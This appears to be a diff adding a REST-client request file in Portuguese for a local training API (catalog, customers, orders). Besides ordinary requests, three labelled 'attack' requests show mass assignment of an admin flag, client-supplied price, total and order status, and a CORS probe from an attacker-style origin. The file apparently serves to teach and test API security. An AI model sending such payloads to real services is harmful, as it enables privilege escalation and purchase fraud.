@@ -1,0 +1,32 @@
+@api = http://localhost:5503
+
+### Catálogo (tente ?ordenarPor=custoInterno e ?ordenarPor=xyz no starter)
+GET {{api}}/produtos?ordenarPor=preco
+
+### Cadastro "honesto"
+POST {{api}}/clientes
+Content-Type: application/json
+
+{ "nome": "Ana Souza", "email": "ana.souza@exemplo.com", "cpf": "529.982.247-25", "senha": "S3nh@-Muito-Secreta!" }
+
+### Ataque: mass assignment de IsAdmin
+POST {{api}}/clientes
+Content-Type: application/json
+
+{ "nome": "Mallory", "email": "mallory@exemplo.com", "cpf": "529.982.247-25", "senha": "S3nh@-Muito-Secreta!", "isAdmin": true }
+
+### Ataque: preço, total e status vindos do cliente
+POST {{api}}/pedidos
+Content-Type: application/json
+
+{
+  "clienteId": "aaaaaaaa-0000-0000-0000-000000000001",
+  "itens": [ { "produtoId": "11111111-0000-0000-0000-000000000003", "quantidade": 2, "precoUnitario": 0.01 } ],
+  "total": 0.02,
+  "status": "Completed"
+}
+
+### Ataque: CORS — veja os headers Access-Control-* da resposta
+OPTIONS {{api}}/pedidos
+Origin: https://evil.example
+Access-Control-Request-Method: POST
